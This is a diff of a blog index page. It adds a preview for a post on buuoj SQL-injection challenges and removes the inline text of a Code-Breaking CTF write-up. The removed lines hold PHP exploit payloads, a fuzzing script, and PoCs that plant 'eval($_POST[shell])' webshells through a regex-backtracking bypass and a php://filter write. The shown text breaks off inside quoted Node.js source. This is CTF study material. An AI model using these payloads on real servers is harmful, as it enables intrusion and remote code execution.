@@ -296,6 +296,163 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/28/buu SQL注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="peri0d">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/toux.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="peri0d的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/28/buu SQL注入/" itemprop="url">buuoj的几个SQL注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-28T17:47:19+08:00">
+                2019-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-wp/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF wp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/09/28/buu SQL注入/" class="leancloud_visitors" data-flag-title="buuoj的几个SQL注入">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>buuoj 上的几个注入，作为学校团队分享的材料</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/09/28/buu SQL注入/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/代码审计/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -399,327 +556,16 @@
 
       
         
-          
-            <p>CodeBreaking : <a href="https://code-breaking.com/" target="_blank" rel="noopener">https://code-breaking.com/</a></p>
+          <p>CodeBreaking : <a href="https://code-breaking.com/" target="_blank" rel="noopener">https://code-breaking.com/</a></p>
 <p>在线正则表达式匹配 : <a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a></p>
 <p>根据已有的大佬们的 wp 对 code breaking 做的一个复现，很多内容都是第一次接触，对涉及到的知识点做些总结和拓展。</p>
-<h1 id="function"><a href="#function" class="headerlink" title="function"></a>function</h1><ul>
-<li><p>create_function 注入</p>
-</li>
-<li><p>源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>正则 <code>/i</code> 不区分大小写，<code>/s</code> 匹配任何不可见字符，包括空格，TAB，换行，<code>/D</code> 如果使用 <code>$</code> 限制结尾字符，则不允许结尾有换行</p>
-</li>
-<li><p><code>preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)</code> 匹配所有字母，数字和下划线开头的字符串</p>
-</li>
-<li><p>想通过 fuzz 找到字符串以达到 bypass 的目的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_start = <span class="string">'http://192.168.233.132:8087/?action='</span></span><br><span class="line">url_end = <span class="string">'var_dump&amp;arg=2'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">	i = chr(i).encode()</span><br><span class="line">	para = i.hex()</span><br><span class="line">	</span><br><span class="line">	url = url_start + <span class="string">'%'</span> + str(para) + url_end</span><br><span class="line">	r = requests.get(url=url)</span><br><span class="line">	</span><br><span class="line">    <span class="comment"># 不出现 error 且 不返回 index.php</span></span><br><span class="line">	<span class="keyword">if</span> (r.headers[<span class="string">'Content-Length'</span>] != <span class="string">'279'</span>) <span class="keyword">and</span> (<span class="string">'error'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text):</span><br><span class="line">		print(para)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>找到了 <code>%5c</code>，即 <code>\</code>，可以让 var_dump 成功执行，ph 牛给了如下的解释。接下来就是 getshell 函数的寻找，要有两个参数且第二个参数可能会导致 RCE</p>
-<blockquote>
-<p>php 里默认命名空间是 \，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名 function_name() 调用，调用的时候其实相当于写了一个相对路径；而如果写 \function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
-</blockquote>
-</li>
-<li><p>不难发现函数 create_function，官方定义如图</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webnoteasy_1.png" alt></p>
-</li>
-<li><p>以如下代码为例</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">'$a,$b'</span>, <span class="string">'return "ln($a) + ln($b) = " . log($a * $b);'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"New anonymous function: $newfunc\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>第一行代码等价于</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"ln($a) + ln($b) = "</span> . log($a * $b); </span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>本题就可以构造 payload : <code>action=\create_function&amp;arg=return &#39;peri0d&#39;;}var_dump(scandir(&#39;../&#39;));/*</code>，然后 readfile(flag) 即可</p>
-<p>相当于</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">'peri0d'</span>;&#125;</span><br><span class="line">	var_dump(scandir(<span class="string">'../'</span>)); <span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">)</span></span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="pcrewaf"><a href="#pcrewaf" class="headerlink" title="pcrewaf"></a>pcrewaf</h1><ul>
-<li><p>PCRE 回溯次数限制绕过正则</p>
-</li>
-<li><p>源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>上传文件，使用正则判断是否含有 php 代码，正则 <code>/i</code> 不区分大小写，<code>/s</code> 匹配任何不可见字符，包括空格，TAB，换行。</p>
-</li>
-<li><p>如果不含有 php 代码，上传的文件会被保存，并在 http 中重定向到文件路径</p>
-</li>
-<li><p>常见的正则引擎有两种，DFA 和 NFA，php 中的 PCRE 库使用的是 NFA，</p>
-<ul>
-<li>DFA : 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li>
-<li>NFA : 从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li>
-</ul>
-</li>
-<li><p>假设待匹配字符串 <code>&lt;?php phpinfo();//aaaaa</code> 匹配顺序如下图 :</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pcre.png" alt></p>
-</li>
-<li><p>在第四步，由于匹配的是 <code>.*</code> 任意多个字符，所以匹配到最后</p>
-</li>
-<li><p>按照正则，在 <code>.*</code> 后面应该是 <code>[(`;?&gt;]</code> ，显然 <code>//aaaaa</code> 不对，所以依次吐出这几个字符，即回溯，这里总共回溯了 8 次，回溯到 <code>;</code> 时 <code>.*</code> 匹配的是 <code>&lt;?php phpinfo()</code> ，后面的 <code>;</code> 符合 <code>[(`;?&gt;]</code> ，所以匹配 <code>;</code> ，然后正则最后的 <code>.*</code> 匹配到最后</p>
-</li>
-<li><p>php 有一个回溯上限 <code>backtrack_limit</code> ，默认是 1000000。如果回溯上限超过 100 万那么 preg_match 返回 false ，既不是 1 也不是 0 ，这样就可以绕过了</p>
-</li>
-<li><p>对应 poc : </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.233.132:8088/index.php'</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">	<span class="string">'file'</span>: BytesIO(<span class="string">b'&lt;?php eval($_POST[shell]);//'</span> + <span class="string">b'a'</span>*<span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求并禁止重定向</span></span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">print(r.headers)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>可以获取 shell 位置，连接即可</p>
-</li>
-<li><p>如下一个 waf : </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/UNION.+?SELECT/is'</span>, $input)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'SQL Injection'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>输入 <code>UNION/*aaaaa*/SELECT</code> ，这个正则表达式执行流程如下</p>
-<ol>
-<li>正则先匹配 UNION，然后 <code>.+?</code> 匹配 / </li>
-<li>由于是非贪婪匹配，匹配最短字符，所以只匹配到 / 就停止</li>
-<li>接着 <code>S</code> 匹配 * ，匹配失败，回溯，由 <code>.+?</code> 匹配 * ，成功</li>
-<li>重复上一步，直到匹配结束</li>
-</ol>
-</li>
-<li><p>这里也可以利用回溯次数限制绕过正则</p>
-</li>
-<li><p><code>preg_match</code> 返回的是匹配到的次数，如果匹配不到会返回 0 ，如果报错就会返回 false 。所以，对 <code>preg_match</code> 来说，只要对返回结果有判断，就可以避免这样的问题</p>
-</li>
-</ul>
-<h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><ul>
-<li><p>伪协议解码 base64 写入 shell</p>
-</li>
-<li><p>代码如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain)&#123;</span><br><span class="line"> $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line"> $output = shell_exec($command);</span><br><span class="line"> $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line"> $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line"> <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">  file_put_contents($log_name, $output);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">endif</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 获取浏览当前页面的用户的 IP 地址，在 data 下创建文件夹，用于存储 output</p>
-</li>
-<li><p>$domain 和 $log 两个参数可控，$domain 用于 dig 命令，$log 用于将结果写入</p>
-</li>
-<li><p>在 php 中，只要是传 filename 的地方，都可以传协议流</p>
-</li>
-<li><p>思路就是 $log_name 处利用伪协议将 $output 处的字符串 base64 解码写入 webshell</p>
-</li>
-<li><p><code>$_SERVER[&#39;SERVER_NAME&#39;]</code> 获取当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。这个值可以更改，由 HTTP Header 中的 Host 决定。</p>
-</li>
-<li><p><code>pathinfo()</code> 函数过滤后缀名，但是，只要在后缀名后加上 <code>/.</code> ，它就获取不到后缀名了，且可以正常写入 <code>.php</code> 之中。php 在处理路径的时候，会递归删除掉路径中存在的 <code>/.</code> </p>
-</li>
-<li><p>php 伪协议 base64 解码中，如果遇到不合规范的字符就直接跳过。base64 解码是按照 4 位解的，所以要只有传入 4 的倍数位字符串才能解码为正常字符串，且传入的 base64 不能以 <code>==</code> 结尾，<code>==</code> 出现在 base64 中间不符合规则，可能会无法解析</p>
-</li>
-<li><p>payload : </p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span></span><br><span class="line"><span class="attribute">Host</span>: php</span><br><span class="line"></span><br><span class="line">domain=YWFhYTw/cGhwIGV2YWwoJF9QT1NUWydzaGVsbCddKTsgLy8q&amp;log=://filter/write=convert.base64-decode/resource=/var/www/html/data/daa6b8b28b2eda419112a887399ce9fc/shell.php/.</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/phpmagic_1.PNG" alt></p>
-</li>
-<li><p>结果 : </p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/phpmagic_2.PNG" alt></p>
-</li>
-</ul>
-<h1 id="phplimit"><a href="#phplimit" class="headerlink" title="phplimit"></a>phplimit</h1><ul>
-<li><p>无参 RCE</p>
-</li>
-<li><p>代码如下 : </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>ciscn 2019 和 rctf 2018 的题目，统计一下这一题的解法，主要是 get_defined_vars() 和 session_id() 两个函数</p>
-</li>
-<li><p><code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code>，<code>\W</code> 匹配任意字母和数字，<code>(?R)?</code> 重复整个模式，<code>?R</code> 是 php 中的一种<a href="https://php.net/manual/zh/regexp.reference.recursive.php" target="_blank" rel="noopener">递归模式</a>，合在一起类似于匹配 <code>x(y(z()))</code> 样式的，且不能存在参数，输入 <code>?code=phpinfo();</code> 可以查看 phpinfo 页面</p>
-</li>
-<li><p>在 rctf 2018 的题目中使用的是 apache 的容器，在本题使用 nginx 容器，都是考虑通过修改请求头信息来实现 RCE</p>
-</li>
-<li><p>在 apache 中可以使用 <code>getallheaders()</code> 获取所有头信息，而在 nginx 中可以使用 <code>get_defined_vars()</code> 函数获取所有已定义的变量列表，然后就可以通过位置函数来操控数组</p>
-</li>
-<li><p><code>session_id()</code> 可以获取 PHPSESSID，虽然 PHPSESSID 只允许字母数字和下划线出现，<code>hex2bin</code> 转换一下编码即可</p>
-</li>
-<li><p>几个 payload :</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一个</span></span><br><span class="line">?code=<span class="keyword">eval</span>(hex2bin(session_id(session_start())));  <span class="comment">// echo 'peri0d';</span></span><br><span class="line">Cookie: PHPSESSID=<span class="number">6563686</span>f2027706572693064273b</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二个</span></span><br><span class="line">?code=<span class="keyword">eval</span>(end(current(get_defined_vars())));&amp;a=var_dump(scandir(<span class="string">'../'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//第三个</span></span><br><span class="line">?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="nodechr"><a href="#nodechr" class="headerlink" title="nodechr"></a>nodechr</h1><ul>
-<li><p>js 的题目，关于 javascript 的大小写特性，两个函数 toLowerCase() 和 toLowerCase() </p>
-</li>
-<li><p>代码如下 : </p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// initial libraries</span></span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>)</span><br><span class="line"><span class="keyword">const</span> sqlite = <span class="built_in">require</span>(<span class="string">'sqlite'</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>)</span><br><span class="line"><span class="keyword">const</span> Router = <span class="built_in">require</span>(<span class="string">'koa-router'</span>)</span><br><span class="line"><span class="keyword">const</span> send = <span class="built_in">require</span>(<span class="string">'koa-send'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>)</span><br><span class="line"><span class="keyword">const</span> isString = <span class="built_in">require</span>(<span class="string">'underscore'</span>).isString</span><br><span class="line"><span class="keyword">const</span> basename = <span class="built_in">require</span>(<span class="string">'path'</span>).basename</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">JSON</span>.parse(fs.readFileSync(<span class="string">'../config.json'</span>, &#123;<span class="attr">encoding</span>: <span class="string">'utf-8'</span>, <span class="attr">flag</span>: <span class="string">'r'</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> app = <span class="keyword">new</span> Koa()</span><br><span class="line">    <span class="keyword">const</span> router = <span class="keyword">new</span> Router()</span><br><span class="line">    <span class="keyword">const</span> db = <span class="keyword">await</span> sqlite.open(<span class="string">':memory:'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."users" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "username" TEXT NOT NULL,</span></span><br><span class="line"><span class="string">        "password" TEXT,</span></span><br><span class="line"><span class="string">        CONSTRAINT "unique_username" UNIQUE ("username")</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."flags" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "flag" TEXT NOT NULL</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> user <span class="keyword">of</span> config.users) &#123;</span><br><span class="line">        <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "users"("username", "password") VALUES ('<span class="subst">$&#123;user.username&#125;</span>', '<span class="subst">$&#123;user.password&#125;</span>')`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "flags"("flag") 